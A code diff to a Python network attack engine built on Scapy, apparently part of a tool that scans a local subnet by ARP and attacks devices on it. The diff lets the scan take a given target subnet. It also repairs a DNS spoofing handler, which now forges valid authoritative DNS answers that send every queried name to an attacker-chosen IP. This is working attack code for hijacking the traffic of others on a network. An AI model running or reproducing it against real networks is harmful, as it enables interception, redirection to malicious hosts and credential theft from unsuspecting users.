@@ -14,6 +14,7 @@ from scapy.all import (
     DHCP,
     DNS,
     DNSQR,
+    DNSRR,
     ICMP,
     IP,
     TCP,
@@ -133,7 +134,7 @@ class ScapyAttackEngine(AttackEngine):
                 f"[ScapyEngine] No active attack found for {target_mac} to stop"
             )
 
-    async def scan_network(self) -> list[tuple[str, str]]:
+    async def scan_network(self, target_subnet: str | None = None) -> list[tuple[str, str]]:
         """
         Perform an ARP scan on the local network.
         Returns list of (IP, MAC) tuples.
@@ -152,92 +153,106 @@ class ScapyAttackEngine(AttackEngine):
 
             from app.core.engine.features_macos import MacOSNetworkFeatures
 
-            # Platform-specific gateway detection
+            # Use provided subnet if available, otherwise detect
+            subnet = target_subnet
             gw_ip = None
-            subnet = None
             iface = None
 
-            if sys.platform == "darwin":
-                # macOS-specific detection
-                macos_features = MacOSNetworkFeatures()
-                gw_ip = await macos_features.get_gateway_ip()
-                iface = await macos_features.get_default_interface()
-
-                if iface and gw_ip:
-                    # Get subnet mask and calculate CIDR
-                    mask = await macos_features.get_subnet_mask(iface)
-                    subnet = await macos_features.calculate_subnet(gw_ip, mask)
-            elif sys.platform == "win32":
-                # Windows-specific detection
+            # If subnet provided, extract gateway from it
+            if subnet:
                 try:
-                    # Use ipconfig to get default gateway on Windows
-                    # Note: asyncio is already imported at module level
-                    result = await asyncio.create_subprocess_exec(
-                        "ipconfig",
-                        stdout=asyncio.subprocess.PIPE,
-                        stderr=asyncio.subprocess.PIPE,
-                        creationflags=(
-                            subprocess.CREATE_NO_WINDOW
-                            if sys.platform == "win32"
-                            else 0
-                        ),
-                    )
-                    stdout, _ = await asyncio.wait_for(
-                        result.communicate(), timeout=5.0
-                    )
-                    output = stdout.decode("utf-8", errors="ignore")
+                    import ipaddress
+                    network = ipaddress.IPv4Network(subnet, strict=False)
+                    # Common gateway: .1 or .254
+                    gw_ip = str(network.network_address + 1)
+                    logger.info(f"[ScapyEngine] Using provided subnet: {subnet}")
+                except Exception as e:
+                    logger.warning(f"[ScapyEngine] Invalid subnet {subnet}: {e}")
+                    subnet = None
 
-                    # Parse gateway from ipconfig output
-                    # Format: Default Gateway . . . . . . . . . : 192.168.1.1
-                    for line in output.splitlines():
-                        if "Default Gateway" in line or "默认网关" in line:
-                            parts = line.split(":")
-                            if len(parts) >= 2:
-                                gw_ip = parts[-1].strip()
-                                break
+            # Platform-specific gateway detection (if subnet not provided)
+            if not subnet:
+                if sys.platform == "darwin":
+                    # macOS-specific detection
+                    macos_features = MacOSNetworkFeatures()
+                    gw_ip = await macos_features.get_gateway_ip()
+                    iface = await macos_features.get_default_interface()
 
-                    # Get interface from route table
+                    if iface and gw_ip:
+                        # Get subnet mask and calculate CIDR
+                        mask = await macos_features.get_subnet_mask(iface)
+                        subnet = await macos_features.calculate_subnet(gw_ip, mask)
+                elif sys.platform == "win32":
+                    # Windows-specific detection
+                    try:
+                        # Use ipconfig to get default gateway on Windows
+                        # Note: asyncio is already imported at module level
+                        result = await asyncio.create_subprocess_exec(
+                            "ipconfig",
+                            stdout=asyncio.subprocess.PIPE,
+                            stderr=asyncio.subprocess.PIPE,
+                            creationflags=(
+                                subprocess.CREATE_NO_WINDOW
+                                if sys.platform == "win32"
+                                else 0
+                            ),
+                        )
+                        stdout, _ = await asyncio.wait_for(
+                            result.communicate(), timeout=5.0
+                        )
+                        output = stdout.decode("utf-8", errors="ignore")
+
+                        # Parse gateway from ipconfig output
+                        # Format: Default Gateway . . . . . . . . . : 192.168.1.1
+                        for line in output.splitlines():
+                            if "Default Gateway" in line or "默认网关" in line:
+                                parts = line.split(":")
+                                if len(parts) >= 2:
+                                    gw_ip = parts[-1].strip()
+                                    break
+
+                        # Get interface from route table
+                        try:
+                            gw_route = conf.route.route("0.0.0.0")
+                            iface = gw_route[3]  # Interface name
+                        except Exception:
+                            # Fallback: use first available interface
+                            iface = (
+                                list(conf.ifaces.values())[0].name if conf.ifaces else None
+                            )
+
+                    except Exception as e:
+                        logger.warning(
+                            f"[ScapyEngine] Failed to determine gateway on Windows: {e}"
+                        )
+                else:
+                    # Linux detection (original logic)
                     try:
                         gw_route = conf.route.route("0.0.0.0")
-                        iface = gw_route[3]  # Interface name
-                    except Exception:
-                        # Fallback: use first available interface
-                        iface = (
-                            list(conf.ifaces.values())[0].name if conf.ifaces else None
-                        )
-
-                except Exception as e:
-                    logger.warning(
-                        f"[ScapyEngine] Failed to determine gateway on Windows: {e}"
-                    )
-            else:
-                # Linux detection (original logic)
-                try:
-                    gw_route = conf.route.route("0.0.0.0")
-                    gw_ip = gw_route[2]
-                    if not gw_ip or gw_ip == "0.0.0.0":
-                        gw_route = conf.route.route("8.8.8.8")
                         gw_ip = gw_route[2]
-                    iface = conf.iface
-                except Exception as e:
-                    logger.warning(
-                        f"[ScapyEngine] Failed to determine gateway via route: {e}"
-                    )
-                    gw_ip = None
+                        if not gw_ip or gw_ip == "0.0.0.0":
+                            gw_route = conf.route.route("8.8.8.8")
+                            gw_ip = gw_route[2]
+                        iface = conf.iface
+                    except Exception as e:
+                        logger.warning(
+                            f"[ScapyEngine] Failed to determine gateway via route: {e}"
+                        )
+                        gw_ip = None
 
-            if not gw_ip:
-                logger.warning("Could not determine gateway IP for scan.")
-                return []
+                if not gw_ip:
+                    logger.warning("Could not determine gateway IP for scan.")
+                    return []
 
-            # Calculate /24 subnet from gateway IP
-            if not subnet and gw_ip:
-                # Extract first 3 octets and form /24 network
-                octets = gw_ip.split(".")
-                if len(octets) == 4:
-                    subnet = f"{octets[0]}.{octets[1]}.{octets[2]}.0/24"
-                    logger.info(
-                        f"Calculated subnet from gateway {gw_ip}: {subnet}"
-                    )
+                # Calculate /24 subnet from gateway IP
+                if not subnet and gw_ip:
+                    # Extract first 3 octets and form /24 network
+                    octets = gw_ip.split(".")
+                    if len(octets) == 4:
+                        subnet = f"{octets[0]}.{octets[1]}.{octets[2]}.0/24"
+                        logger.info(
+                            f"Calculated subnet from gateway {gw_ip}: {subnet}"
+                        )
 
             logger.info(f"[ScapyEngine] Scanning subnet {subnet} on interface {iface}")
 
@@ -480,25 +495,41 @@ class ScapyAttackEngine(AttackEngine):
             end_time = time.time() + duration
 
             def handle_dns(packet):
-                if DNS in packet and packet[DNS].qr == 0:  # DNS Query
-                    # Create spoofed DNS response
-                    spoofed_dns = (
-                        Ether(dst=packet[Ether].src, src=my_mac)
-                        / IP(src=packet[IP].dst, dst=packet[IP].src)
-                        / UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)
-                        / DNS(
-                            id=packet[DNS].id,
-                            qr=1,  # Response
-                            aa=1,
-                            qd=packet[DNS].qd,
-                            an=DNSQR(
-                                rrname=packet[DNS].qd.qname,
-                                rdata=redirect_ip,
-                                type=packet[DNS].qd.qtype,
-                            ),
+                try:
+                    if DNS in packet and packet[DNS].qr == 0:  # DNS Query
+                        # Validate we have the required fields
+                        if not packet[DNS].qd:
+                            return
+                        
+                        qname = packet[DNS].qd.qname
+                        qtype = packet[DNS].qd.qtype if hasattr(packet[DNS].qd, 'qtype') else 1
+                        
+                        # Create spoofed DNS response using DNSRR (Resource Record)
+                        # DNSRR is for answers, DNSQR is for questions
+                        spoofed_dns = (
+                            Ether(dst=packet[Ether].src, src=my_mac)
+                            / IP(src=packet[IP].dst, dst=packet[IP].src)
+                            / UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)
+                            / DNS(
+                                id=packet[DNS].id,
+                                qr=1,  # Response
+                                aa=1,  # Authoritative answer
+                                rd=packet[DNS].rd,  # Recursion desired (echo)
+                                ra=1,  # Recursion available
+                                ancount=1,  # One answer
+                                qd=packet[DNS].qd,  # Echo the question
+                                an=DNSRR(
+                                    rrname=qname,
+                                    type=qtype,
+                                    ttl=300,  # 5 minutes TTL
+                                    rdata=redirect_ip,
+                                ),
+                            )
                         )
-                    )
-                    sendp(spoofed_dns, iface=iface, verbose=False)
+                        sendp(spoofed_dns, iface=iface, verbose=False)
+                        logger.debug(f"[ScapyEngine] DNS spoofed: {qname} -> {redirect_ip}")
+                except Exception as e:
+                    logger.debug(f"[ScapyEngine] DNS handle error: {e}")
 
             # Start sniffing DNS queries
             sniff_task = asyncio.create_task(
